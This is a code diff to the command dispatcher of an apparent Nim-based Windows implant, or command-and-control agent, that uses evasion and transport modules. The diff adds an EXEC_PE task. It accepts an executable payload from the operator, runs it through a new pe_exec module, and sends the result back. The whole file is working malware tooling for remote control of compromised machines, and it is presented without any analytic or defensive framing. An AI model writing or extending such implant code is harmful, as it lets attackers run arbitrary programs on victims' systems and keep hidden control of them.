@@ -1,7 +1,7 @@
 ## Command dispatcher for Nim agent.
 import winim/lean, winim/inc/tlhelp32
 import std/[os, osproc, strutils, strformat, json, random, base64]
-import config, transport, evasion
+import config, transport, evasion, pe_exec
 
 var sleepSecDyn* = SleepSec
 var jitterDyn*   = JitterPct
@@ -386,6 +386,11 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
       if j.hasKey("working_hours"): workingHoursDyn = j["working_hours"].getStr()
       t.sendResult(id, "[+] config updated", "")
     except: t.sendResult(id, "", "config: " & getCurrentExceptionMsg())
+  of "EXEC_PE":
+    if payload.len == 0: t.sendResult(id, "", "no PE payload"); return
+    try:
+      t.sendResult(id, execPE(payload), "")
+    except: t.sendResult(id, "", "exec_pe: " & getCurrentExceptionMsg())
   of "KILL":
     t.sendResult(id, "bye", "")
     quit(0)
